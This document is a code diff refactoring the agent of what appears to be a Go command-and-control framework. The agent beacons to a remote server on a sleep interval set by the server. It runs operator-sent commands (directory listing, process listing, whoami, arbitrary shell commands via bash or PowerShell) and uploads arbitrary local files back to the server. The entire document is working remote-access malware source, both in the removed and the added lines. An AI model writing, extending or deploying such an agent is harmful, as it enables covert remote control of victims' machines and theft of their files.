@@ -7,20 +7,14 @@ import (
 	"d3c/agent/interfaces"
 	"encoding/gob"
 	"encoding/hex"
-	"fmt"
 	"global"
 	"helpers"
 	"log"
 	"net"
 	"os"
-	"os/exec"
-	"os/user"
-	"runtime"
 	"strconv"
 	"strings"
 	"time"
-
-	"github.com/mitchellh/go-ps"
 )
 
 var (
@@ -44,8 +38,11 @@ func main() {
 
 	for {
 		channel := connectionServer()
-
-		defer channel.Close()
+		if channel == nil {
+			log.Println("Failed to connect to server, retrying in 5 seconds...")
+			time.Sleep(5 * time.Second)
+			continue
+		}
 
 		//Sending message to server
 		gob.NewEncoder(channel).Encode(message)
@@ -60,156 +57,64 @@ func main() {
 
 				if commandID != -1 {
 					mapping := map[int]interfaces.Command{
-						1: commands.Cd{Command: command.Request},
-						2: commands.Ls{Command: command.Request},
-						3: commands.Ps{},
-						4: commands.Pwd{},
-						5: commands.Whoami{},
+						agent_helpers.CMD_CD:     commands.Cd{Command: command.Request},
+						agent_helpers.CMD_LS:     commands.Ls{Command: command.Request},
+						agent_helpers.CMD_PS:     commands.Ps{},
+						agent_helpers.CMD_PWD:    commands.Pwd{},
+						agent_helpers.CMD_WHOAMI: commands.Whoami{},
+						agent_helpers.CMD_SEND:   commands.Send{Command: command.Request},
+						agent_helpers.CMD_GET:    commands.Get{Command: command.Request},
+						agent_helpers.CMD_SLEEP:  commands.Sleep{Command: command.Request},
 					}
 
-					message.Commands[i].Response, _ = mapping[commandID].Exec()
+					response, err := mapping[commandID].Exec()
+					if err != nil {
+						message.Commands[i].Response = "Error: " + err.Error()
+					} else {
+						message.Commands[i].Response = response
+					}
+
+					// Handle file operations for get command
+					if commandID == agent_helpers.CMD_GET {
+						separatedCommand := helpers.CommandsSplit(command.Request)
+						if len(separatedCommand) > 1 && len(separatedCommand[1]) > 0 {
+							fileContent, fileErr := os.ReadFile(separatedCommand[1])
+							if fileErr != nil {
+								message.Commands[i].File.Error = true
+								message.Commands[i].Response = "File read error: " + fileErr.Error()
+							} else {
+								message.Commands[i].File.Content = fileContent
+								message.Commands[i].File.Name = separatedCommand[1]
+							}
+						}
+					}
+
+					// Handle sleep command to update heartbeat
+					if commandID == agent_helpers.CMD_SLEEP {
+						separatedCommand := helpers.CommandsSplit(command.Request)
+						if len(separatedCommand) > 1 {
+							timeStr := strings.TrimSpace(separatedCommand[1])
+							if newHeartBeat, err := strconv.Atoi(timeStr); err == nil {
+								heartBeat = newHeartBeat
+							}
+						}
+					}
 				} else {
-					message.Commands[i].Response = shellExecution(command.Request)
+					// Default shell execution for unknown commands
+					defaultCmd := commands.Default{Command: command.Request}
+					response, err := defaultCmd.Exec()
+					if err != nil {
+						message.Commands[i].Response = "Error: " + err.Error()
+					} else {
+						message.Commands[i].Response = response
+					}
 				}
 			}
 		}
 
+		channel.Close()
 		time.Sleep(time.Duration(heartBeat) * time.Second)
 	}
-}
-
-func execCommand(command string, i int) (response string) {
-
-	separateCommand := helpers.CommandsSplit(command)
-	baseCommand := separateCommand[0]
-
-	switch baseCommand {
-	case "ls":
-		response = listFiles()
-	case "pwd":
-		response = listCurrentDirectory()
-	case "cd":
-		if len(separateCommand) > 1 && len(separateCommand[1]) > 0 {
-			response = changeDirectory(separateCommand[1])
-		} else {
-			response = "Usage: cd <directory>"
-		}
-	case "whoami":
-		response = whoami()
-	case "ps":
-		response = processList()
-	case "send":
-		response = saveFile(message.Commands[i].File)
-	case "get":
-		if len(separateCommand) > 1 && len(separateCommand[1]) > 0 {
-			response = sendFile(command, i)
-		} else {
-			response = "Usage: get <file>"
-		}
-	case "sleep":
-		if len(separateCommand) > 1 {
-			time := strings.TrimSpace(separateCommand[1])
-			heartBeat, _ = strconv.Atoi(time)
-			response = "Current sleep: " + time + " seconds"
-		} else {
-			response = "Usage: sleep <seconds>"
-		}
-	default:
-		response = shellExecution(command)
-	}
-
-	return response
-}
-
-// Commands implementations
-func listFiles() (resp string) {
-	files, _ := os.ReadDir(listCurrentDirectory())
-
-	for _, v := range files {
-		resp += v.Name() + "\n"
-	}
-	return "\n" + resp
-}
-
-func listCurrentDirectory() (currentDir string) {
-	currentDir, _ = os.Getwd()
-	return currentDir
-}
-
-func changeDirectory(directory string) (resp string) {
-	resp = "Current directory change success!"
-	err := os.Chdir(directory)
-
-	if err != nil {
-		resp = "Directory change error: " + err.Error()
-	}
-
-	return resp
-}
-
-func whoami() (resp string) {
-	user, _ := user.Current()
-	resp = user.Username
-	return resp
-}
-
-func processList() (resp string) {
-	process, _ := ps.Processes()
-	for _, v := range process {
-		resp += fmt.Sprintf("%d -> %d -> %s \n", v.PPid(), v.Pid(), v.Executable())
-	}
-	return resp
-}
-
-func shellExecution(command string) (resp string) {
-
-	if runtime.GOOS == "windows" {
-		output, _ := exec.Command("powershell.exe", "/C", command).CombinedOutput()
-		resp = string(output)
-	} else if runtime.GOOS == "linux" {
-		output, _ := exec.Command("bash", "-c", command).Output()
-		resp = string(output)
-	} else {
-		resp = "System not implemented"
-	}
-
-	return resp
-}
-
-func saveFile(file global.File) (resp string) {
-	resp = "Send file success!"
-
-	fileName := strings.Split(file.Name, "/")
-	err := os.WriteFile(fileName[len(fileName)-1], file.Content, 0644)
-
-	if err != nil {
-		resp = "Send file error: " + err.Error()
-	}
-
-	return resp
-}
-
-func sendFile(fullCommand string, i int) (resp string) {
-	resp = "Get file success!"
-
-	separateCommand := helpers.CommandsSplit(fullCommand)
-
-	if len(separateCommand) > 1 && len(separateCommand[1]) > 0 {
-		var err error
-		message.Commands[i].File.Content, err = os.ReadFile(separateCommand[1])
-
-		if err != nil {
-			resp = "Open file error: " + err.Error()
-			message.Commands[i].File.Error = true
-		}
-
-		message.Commands[i].File.Name = separateCommand[1]
-	} else {
-		resp = "Usage: get <file>"
-		message.Commands[i].File.Error = true
-	}
-
-	return resp
 }
 
 ///////
@@ -233,6 +138,10 @@ func generateID() string {
 }
 
 func connectionServer() (channel net.Conn) {
-	channel, _ = net.Dial("tcp", SERVER+":"+PORT)
+	channel, err := net.Dial("tcp", SERVER+":"+PORT)
+	if err != nil {
+		log.Printf("Connection error: %v", err)
+		return nil
+	}
 	return channel
 }
